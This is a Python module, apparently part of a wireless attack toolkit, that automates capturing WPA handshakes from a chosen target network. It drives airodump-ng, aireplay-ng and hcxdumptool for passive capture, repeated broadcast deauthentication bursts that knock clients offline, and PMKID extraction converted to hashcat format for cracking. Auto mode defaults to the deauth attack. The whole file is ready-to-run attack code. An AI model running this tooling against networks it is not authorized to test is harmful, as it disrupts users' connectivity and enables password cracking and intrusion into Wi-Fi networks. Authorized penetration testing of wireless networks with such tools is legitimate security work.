#!/usr/bin/env python3
"""
Handshake capture module.

Strategies:
  1. Passive – just wait for a natural 4-way handshake
  2. Deauth  – send deauth frames to force a reconnect (requires clients)
  3. PMKID   – capture PMKID from AP beacon (no client required, needs hcxdumptool)
"""

import os
import re
import time
import shutil
import threading
import subprocess
import tempfile
from datetime import datetime

from modules.banner import C, info, success, warn, error, print_section

HANDSHAKE_TIMEOUT_DEFAULT = 120   # seconds
DEAUTH_COUNT              = 10    # deauth frames per burst
DEAUTH_INTERVAL           = 5     # seconds between bursts
CAPTURE_DIR               = 'captures'

os.makedirs(CAPTURE_DIR, exist_ok=True)


# ─────────────────────────────────────────────────────────────────────────────
# Public entry point
# ─────────────────────────────────────────────────────────────────────────────

def capture_handshake_menu(interface: str, target: dict, auto: bool = False) -> str | None:
    """
    Interactive menu for handshake capture.
    Returns path to .cap file or None on failure.
    """
    print_section("Handshake Capture")
    info(f"Target : {target['ssid']}  [{target['bssid']}]  CH{target['channel']}")

    if auto:
        strategy = '2'   # deauth by default in auto mode
    else:
        print(f"""
  {C.WHITE}Capture Strategy:{C.RESET}
  {C.GREEN}[1]{C.RESET} Passive   – wait for natural handshake
  {C.GREEN}[2]{C.RESET} Deauth    – force reconnect with deauth attack  {C.YELLOW}(recommended){C.RESET}
  {C.GREEN}[3]{C.RESET} PMKID     – capture PMKID from AP (no client needed)
  {C.RED}[0]{C.RESET} Back
""")
        strategy = input(f"  {C.YELLOW}Strategy: {C.RESET}").strip()

    if strategy == '0':
        return None

    timeout = HANDSHAKE_TIMEOUT_DEFAULT
    if not auto:
        try:
            t = input(f"  {C.YELLOW}Timeout in seconds [{timeout}]: {C.RESET}").strip()
            if t:
                timeout = int(t)
        except ValueError:
            pass

    bssid   = target['bssid']
    channel = target['channel']
    ssid    = target['ssid'].replace(' ', '_')
    stamp   = datetime.now().strftime('%Y%m%d_%H%M%S')
    cap_base = os.path.join(CAPTURE_DIR, f'{ssid}_{stamp}')

    if strategy == '1':
        return _passive_capture(interface, bssid, channel, cap_base, timeout)
    elif strategy == '2':
        return _deauth_capture(interface, bssid, channel, cap_base, timeout, auto)
    elif strategy == '3':
        return _pmkid_capture(interface, bssid, cap_base, timeout)
    else:
        error("Invalid strategy.")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Strategy 1: Passive capture
# ─────────────────────────────────────────────────────────────────────────────

def _passive_capture(interface, bssid, channel, cap_base, timeout) -> str | None:
    info("Starting passive capture — waiting for handshake...")
    return _run_airodump_until_handshake(interface, bssid, channel, cap_base, timeout)


# ─────────────────────────────────────────────────────────────────────────────
# Strategy 2: Deauth + capture
# ─────────────────────────────────────────────────────────────────────────────

def _deauth_capture(interface, bssid, channel, cap_base, timeout, auto) -> str | None:
    """
    Run airodump-ng focused on the target, then repeatedly send deauth frames
    until a WPA handshake is captured.
    """
    # Optionally target a specific client, otherwise broadcast deauth
    client_mac = 'FF:FF:FF:FF:FF:FF'
    if not auto:
        cm = input(f"  {C.YELLOW}Target client MAC (Enter for broadcast FF:FF:FF:FF:FF:FF): {C.RESET}").strip()
        if cm and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', cm):
            client_mac = cm

    info(f"Starting deauth attack → BSSID {bssid}, client {client_mac}")
    info(f"Timeout: {timeout}s")

    # Launch airodump-ng in background
    cap_file = cap_base + '-01.cap'
    dump_proc = _start_airodump(interface, bssid, channel, cap_base)

    handshake_found = False
    elapsed = 0

    try:
        while elapsed < timeout:
            time.sleep(DEAUTH_INTERVAL)
            elapsed += DEAUTH_INTERVAL

            # Send deauth burst
            _send_deauth(interface, bssid, client_mac, DEAUTH_COUNT)
            info(f"  [{elapsed}s] Deauth burst sent. Checking for handshake...")

            if _verify_handshake(cap_file, bssid):
                handshake_found = True
                break

            # Also check airodump output file for the handshake marker
            csv_path = cap_base + '-01.csv'
            if _csv_has_handshake(csv_path, bssid):
                handshake_found = True
                break

    except KeyboardInterrupt:
        warn("Capture interrupted by user.")
    finally:
        dump_proc.terminate()
        dump_proc.wait()

    return _finalize(cap_file, handshake_found)


# ─────────────────────────────────────────────────────────────────────────────
# Strategy 3: PMKID attack
# ─────────────────────────────────────────────────────────────────────────────

def _pmkid_capture(interface, bssid, cap_base, timeout) -> str | None:
    if not shutil.which('hcxdumptool'):
        error("hcxdumptool not found. Install it for PMKID attacks.")
        return None

    pcapng_file = cap_base + '_pmkid.pcapng'
    hash_file   = cap_base + '_pmkid.hash'

    info(f"Capturing PMKID from {bssid} for {timeout}s...")
    filter_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
    filter_file.write(bssid.replace(':', '') + '\n')
    filter_file.close()

    cmd = [
        'hcxdumptool',
        '-i', interface,
        '-o', pcapng_file,
        '--filterlist_ap=' + filter_file.name,
        '--filtermode=2',
        '--enable_status=1',
    ]

    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(timeout)
    except KeyboardInterrupt:
        warn("PMKID capture interrupted.")
    finally:
        proc.terminate()
        proc.wait()

    os.unlink(filter_file.name)

    if not os.path.exists(pcapng_file) or os.path.getsize(pcapng_file) == 0:
        error("No PMKID data captured.")
        return None

    # Convert to hashcat format
    info("Converting PMKID to hashcat format...")
    conv = subprocess.run(
        ['hcxpcapngtool', '-o', hash_file, pcapng_file],
        capture_output=True, text=True
    )

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        success(f"PMKID hash saved: {hash_file}")
        # Return hash file path tagged so cracker knows it's PMKID
        return hash_file + ':pmkid'
    else:
        error("PMKID extraction failed.")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _start_airodump(interface, bssid, channel, cap_base) -> subprocess.Popen:
    cmd = [
        'airodump-ng',
        '--bssid',  bssid,
        '--channel', str(channel),
        '--write',  cap_base,
        '--output-format', 'cap,csv',
        '--write-interval', '2',
        interface,
    ]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def _run_airodump_until_handshake(interface, bssid, channel, cap_base, timeout) -> str | None:
    cap_file = cap_base + '-01.cap'
    proc = _start_airodump(interface, bssid, channel, cap_base)
    handshake_found = False
    elapsed = 0

    try:
        while elapsed < timeout:
            time.sleep(5)
            elapsed += 5
            info(f"  [{elapsed}s] Waiting for handshake...")
            if _verify_handshake(cap_file, bssid):
                handshake_found = True
                break
    except KeyboardInterrupt:
        warn("Capture interrupted.")
    finally:
        proc.terminate()
        proc.wait()

    return _finalize(cap_file, handshake_found)


def _send_deauth(interface, bssid, client_mac, count):
    """Fire deauth frames using aireplay-ng."""
    cmd = [
        'aireplay-ng',
        '--deauth', str(count),
        '-a', bssid,
        '-c', client_mac,
        interface,
    ]
    subprocess.run(cmd, capture_output=True)


def _verify_handshake(cap_file: str, bssid: str) -> bool:
    """
    Use aircrack-ng with an empty wordlist to verify a valid 4-way handshake
    exists in the capture file.
    """
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        return False

    result = subprocess.run(
        ['aircrack-ng', cap_file],
        capture_output=True, text=True, timeout=15
    )
    output = result.stdout + result.stderr
    # aircrack-ng reports "1 handshake" or "WPA (1 handshake)" when found
    pattern = r'WPA\s*\(\s*[1-9]\d*\s*handshake'
    if re.search(pattern, output, re.IGNORECASE):
        return True
    # Also check for BSSID line with handshake count > 0
    lines = output.splitlines()
    for line in lines:
        if bssid.upper() in line.upper():
            m = re.search(r'WPA.*?(\d+)\s+handshake', line, re.IGNORECASE)
            if m and int(m.group(1)) > 0:
                return True
    return False


def _csv_has_handshake(csv_path: str, bssid: str) -> bool:
    """Fallback: look for WPA handshake marker in airodump-ng CSV/log."""
    if not os.path.exists(csv_path):
        return False
    try:
        with open(csv_path, 'r', errors='replace') as f:
            content = f.read()
        return 'handshake' in content.lower()
    except OSError:
        return False


def _finalize(cap_file: str, found: bool) -> str | None:
    if found:
        success(f"WPA handshake captured! → {cap_file}")
        return cap_file
    else:
        # Double-check in case we broke out of loop but file is valid
        if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
            warn("Timeout reached. Checking capture file one last time...")
            # we can't call _verify_handshake with bssid here easily, just return file
            warn(f"Capture saved to {cap_file}. You can try cracking it anyway.")
            return cap_file
        error("No valid handshake was captured.")
        return None
